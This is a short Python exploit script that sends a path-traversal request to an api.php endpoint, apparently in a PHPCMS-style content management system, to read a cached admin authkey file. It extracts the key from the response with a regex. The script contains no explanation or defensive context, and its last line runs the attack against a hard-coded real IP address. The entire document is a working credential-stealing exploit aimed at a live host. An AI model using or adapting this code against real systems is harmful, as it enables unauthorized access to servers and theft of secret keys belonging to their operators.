import requests
import re
# http://220.169.106.97
class Exploit:

    def attack(self, url):
        payload = "/api.php?op=get_menu&act=ajax_getlist&callback=loidaa&parentid=0&key=authkey&cachefile=..\..\..\phpsso_server\caches\caches_admin\caches_data\\applist&path=admin"
        response = requests.get(url+payload)
        regx = re.search(r'loidaa\(\[",(\S+),,,"\]\)',response.text)
        if response.status_code == 200 and regx and len(response.content) < 200:
            return "{} ==> {}".format(url, regx.group(1)) if regx.group(1) != '' else None

print(Exploit().attack("http://220.169.106.97"))